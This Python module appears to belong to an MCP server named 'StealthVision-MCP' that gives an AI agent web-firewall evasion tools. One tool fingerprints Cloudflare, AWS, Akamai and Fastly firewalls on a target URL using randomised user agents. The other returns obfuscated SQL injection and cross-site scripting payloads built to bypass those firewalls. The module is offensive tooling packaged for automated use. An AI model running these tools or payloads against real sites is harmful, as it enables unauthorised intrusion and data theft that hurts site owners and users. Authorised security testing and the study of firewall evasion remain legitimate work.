"""StealthVision-MCP - WAF Bypass Automation Module"""
import httpx
import logging
from mcp_instance import mcp

logger = logging.getLogger("stealthvision")
from config import USER_AGENT, DEFAULT_TIMEOUT, get_random_user_agent

WAF_SIGNATURES = {
    "cloudflare": ["cf-ray", "cloudflare", "server: cloudflare"],
    "aws_waf": ["x-amzn-trace-id", "x-amz-apigw-id"],
    "akamai": ["akamai", "akamai-ghost"],
    "fastly": ["fastly", "x-fastly"],
}

WAF_BYPASS_PAYLOADS = {
    "sql_injection": [
        "' OR 1=1--",
        "'/**/OR/**/1=1--",
        "'%00OR%001=1--",
        "'XOR/**/1=1--",
        "' OR 'x'='x'--",
    ],
    "xss": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<<script>alert(1)//<script>",
        "<ScRiPt>alert(1)</sCrIpT>",
    ]
}

@mcp.tool()
def waf_detect(url: str) -> dict:
    """Detect WAF presence on target URL."""
    try:
        client = httpx.Client(timeout=DEFAULT_TIMEOUT, headers={"User-Agent": get_random_user_agent()})
        r = client.get(url)
        
        detected_waf = []
        for waf_name, signatures in WAF_SIGNATURES.items():
            for sig in signatures:
                if sig.lower() in r.text.lower() or sig.lower() in str(r.headers).lower():
                    detected_waf.append(waf_name)
                    break
        
        return {"detected": detected_waf, "count": len(detected_waf), "response_code": r.status_code, "success": True}
    except Exception as e:
        return {"error": str(e), "success": False}

@mcp.tool()
def waf_bypass_payload(vuln_type: str = "sql_injection") -> dict:
    """Get WAF bypass payloads for testing."""
    payloads = WAF_BYPASS_PAYLOADS.get(vuln_type, WAF_BYPASS_PAYLOADS["sql_injection"])
    return {"payloads": payloads, "count": len(payloads), "success": True}